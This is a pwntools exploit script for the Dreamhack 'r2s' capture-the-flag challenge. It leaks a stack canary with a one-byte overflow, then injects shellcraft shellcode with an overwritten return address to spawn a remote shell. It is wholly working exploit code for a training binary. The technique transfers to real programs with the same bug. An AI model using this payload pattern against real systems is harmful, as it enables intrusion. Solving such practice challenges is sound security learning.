from pwn import *


def slog(n, m): return success(': '.join([n, hex(m)]))

# Settings
# p = process('./r2s')
p = remote('host1.dreamhack.games', 11903)
context.arch = 'amd64'

# Get buf address
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('buf', buf)

# Get distance between buf and rbp
p.recvuntil(b'$rbp: ')
buf2rbp = int(p.recvline().strip()) # decimal to hex
buf2canary = buf2rbp - 8
slog('buf <=> rbp', buf2rbp)
slog('buf <=> canary', buf2canary)

# Get canary
payload = b'A' * (buf2canary + 1)
p.sendafter(b'Input: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
slog('Canary', canary)

# Exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2canary, b'A') + p64(canary) + b'B' * 0x08 + p64(buf) # (shellcode + A) + canary + B(SFP) + buf(RET)
p.sendlineafter(b'Input: ', payload)
p.interactive()
